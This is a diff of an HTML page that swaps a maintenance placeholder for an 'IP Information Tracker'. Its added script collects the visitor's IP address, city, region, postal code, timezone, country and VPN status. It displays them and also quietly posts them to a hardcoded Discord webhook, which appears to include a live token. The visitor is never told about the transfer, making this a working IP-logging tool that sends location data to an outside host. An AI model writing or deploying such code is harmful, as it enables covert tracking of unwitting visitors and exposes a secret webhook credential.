@@ -3,122 +3,117 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Maintenance</title>
+    <title>IP Information Tracker</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://kit.fontawesome.com/76661d0faf.js" crossorigin="anonymous"></script>
     <link href="https://fonts.googleapis.com/css2?family=Geist:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    fontFamily: {
-                        geist: ['Geist', 'sans-serif'],
-                    },
-                    animation: {
-                        'gradient': 'gradient 8s linear infinite',
-                        'float': 'float 6s ease-in-out infinite',
-                        'pulse-slow': 'pulse 4s cubic-bezier(0.4, 0, 0.6, 1) infinite',
-                    },
-                    keyframes: {
-                        gradient: {
-                            '0%, 100%': {
-                                'background-size': '200% 200%',
-                                'background-position': 'left center'
-                            },
-                            '50%': {
-                                'background-size': '200% 200%',
-                                'background-position': 'right center'
-                            }
-                        },
-                        float: {
-                            '0%, 100%': {
-                                transform: 'translateY(0)',
-                            },
-                            '50%': {
-                                transform: 'translateY(-20px)',
-                            }
-                        }
-                    },
-                },
-            },
-        }
-    </script>
     <style>
-        .gradient-text {
-            background: linear-gradient(to right, #fff, #888, #fff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            background-size: 200% auto;
-            animation: gradient 8s linear infinite;
-        }
-        
-        .grid-background {
-            background-image: radial-gradient(circle at 1px 1px, rgba(255, 255, 255, 0.05) 1px, transparent 0);
-            background-size: 40px 40px;
-            background-position: -19px -19px;
+        body {
+            font-family: 'Geist', sans-serif;
         }
     </style>
 </head>
-<body class="bg-black font-geist min-h-screen flex flex-col items-center justify-center p-4 grid-background">
-    <!-- Ambient background effects -->
-    <div class="fixed inset-0 bg-gradient-to-b from-purple-500/5 to-blue-500/5 pointer-events-none"></div>
-    
-    <div class="max-w-3xl mx-auto text-center relative z-10">
-        <!-- Main Content -->
-        <div class="mb-12 animate-float">
-            <div class="relative">
-                <div class="absolute inset-0 rounded-full bg-blue-500/20 blur-3xl transform -translate-y-4"></div>
-                <div class="relative bg-zinc-900/80 backdrop-blur-xl rounded-2xl p-8 border border-white/5 shadow-2xl">
-                    <div class="maintenance-icon text-white mb-6">
-                        <i class="fas fa-cog text-6xl animate-spin-slow" style="--tw-spin-duration: 4s;"></i>
-                    </div>
-                    <h1 class="gradient-text text-5xl font-bold mb-6 tracking-tight">
-                        Under Maintenance
-                    </h1>
-                    <p class="text-gray-400 text-lg mb-8 leading-relaxed max-w-xl mx-auto">
-                        We're currently upgrading our systems to bring you an even better experience. 
-                        We'll be back online shortly.
-                    </p>
-                </div>
+<body class="bg-gray-900 text-white min-h-screen">
+    <div class="container mx-auto px-4 py-8">
+        <div class="max-w-2xl mx-auto bg-gray-800 rounded-lg shadow-xl p-6">
+            <h1 class="text-3xl font-bold mb-6 text-center">IP Information Tracker</h1>
+            <div id="loading" class="text-center hidden">
+                <i class="fas fa-spinner fa-spin text-2xl"></i>
+                <p class="mt-2">Fetching IP information...</p>
             </div>
-        </div>
-
-        <!-- Status Box -->
-        <div class="bg-zinc-900/80 backdrop-blur rounded-xl p-6 mb-8 inline-block border border-white/5">
-            <div class="flex items-center space-x-3">
-                <div class="relative">
-                    <div class="h-3 w-3 rounded-full bg-yellow-500/20"></div>
-                    <div class="absolute inset-0 h-3 w-3 rounded-full bg-yellow-500 animate-ping"></div>
-                    <div class="absolute inset-0 h-3 w-3 rounded-full bg-yellow-500 animate-pulse"></div>
-                </div>
-                <p class="text-gray-300 text-sm font-medium">
-                    System maintenance in progress
-                </p>
-            </div>
-        </div>
-
-        <!-- Estimated Time -->
-        <div class="bg-zinc-900/80 backdrop-blur rounded-xl p-6 border border-white/5">
-            <div class="flex items-center justify-center space-x-3">
-                <i class="fas fa-clock text-gray-400"></i>
-                <p class="text-gray-300 text-sm font-medium">
-                    Estimated completion time: <span class="text-white">69 hours</span>
-                </p>
-            </div>
+            <div id="info" class="space-y-4"></div>
+            <button onclick="getAndSendIPInfo()" class="mt-6 w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded transition duration-200">
+                <i class="fas fa-sync-alt mr-2"></i>Fetch IP Info
+            </button>
         </div>
     </div>
 
-    <!-- Footer -->
-    <footer class="fixed bottom-0 w-full p-6 text-center">
-        <div class="bg-zinc-900/80 backdrop-blur-sm rounded-xl py-3 px-6 inline-block border border-white/5">
-            <p class="text-gray-400 text-sm">
-                © 2024 RedFox Studios. All rights reserved.
-            </p>
-        </div>
-    </footer>
+    <script>
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1325525927144329317/PCYE5RoiJjlYSwWmmIK50i9xnkzIGtPWLAtq81RwzSrrM-ebs6JAD3amygj-jzjQNQOk'; // Replace with your webhook URL
 
-    <!-- Decorative elements -->
-    <div class="fixed top-0 left-0 w-full h-1 bg-gradient-to-r from-blue-500 to-purple-500 opacity-20"></div>
+        async function fetchIPInfo(ip) {
+            const info = {
+                ip: await fetch('https://api.ipify.org').then(r => r.text()),
+                city: await fetch(`https://ipapi.co/${ip}/city`).then(r => r.text()),
+                region: await fetch(`https://ipapi.co/${ip}/region`).then(r => r.text()),
+                postal: await fetch(`https://ipapi.co/${ip}/postal`).then(r => r.text()),
+                timezone: await fetch(`https://ipapi.co/${ip}/timezone`).then(r => r.text()),
+                currency: await fetch(`https://ipapi.co/${ip}/currency`).then(r => r.text()),
+                country: await fetch(`https://ipapi.co/${ip}/country_name`).then(r => r.text()),
+                callcode: await fetch(`https://ipapi.co/${ip}/country_calling_code`).then(r => r.text())
+            };
+
+            const vpnResponse = await fetch('http://ip-api.com/json?fields=proxy');
+            const vpnData = await vpnResponse.json();
+            info.vpn = vpnData.proxy;
+
+            return info;
+        }
+
+        async function getAndSendIPInfo() {
+            const loading = document.getElementById('loading');
+            const infoDiv = document.getElementById('info');
+            
+            loading.classList.remove('hidden');
+            infoDiv.innerHTML = '';
+
+            try {
+                const publicIP = await fetch('https://api.ipify.org').then(r => r.text());
+                const info = await fetchIPInfo(publicIP);
+
+                // Display information
+                const items = [
+                    { icon: 'fa-network-wired', label: 'IP', value: info.ip },
+                    { icon: 'fa-city', label: 'City', value: info.city },
+                    { icon: 'fa-map-marker-alt', label: 'Region', value: info.region },
+                    { icon: 'fa-mailbox', label: 'Postal', value: info.postal },
+                    { icon: 'fa-clock', label: 'Timezone', value: info.timezone },
+                    { icon: 'fa-money-bill', label: 'Currency', value: info.currency },
+                    { icon: 'fa-globe', label: 'Country', value: info.country },
+                    { icon: 'fa-phone', label: 'Call Code', value: info.callcode },
+                    { icon: 'fa-shield-alt', label: 'VPN', value: info.vpn ? 'Yes' : 'No' }
+                ];
+
+                infoDiv.innerHTML = items.map(item => `
+                    <div class="flex items-center space-x-4 p-3 bg-gray-700 rounded">
+                        <i class="fas ${item.icon} w-6"></i>
+                        <span class="font-semibold w-24">${item.label}:</span>
+                        <span class="flex-1">${item.value}</span>
+                    </div>
+                `).join('');
+
+                // Send to Discord
+                const webhookData = {
+                    embeds: [{
+                        title: 'IP Information Report',
+                        color: 3447003,
+                        fields: items.map(item => ({
+                            name: item.label,
+                            value: item.value.toString(),
+                            inline: true
+                        })),
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(webhookData)
+                });
+
+            } catch (error) {
+                infoDiv.innerHTML = `
+                    <div class="bg-red-500 text-white p-4 rounded">
+                        Error: ${error.message}
+                    </div>
+                `;
+            } finally {
+                loading.classList.add('hidden');
+            }
+        }
+    </script>
 </body>
 </html>
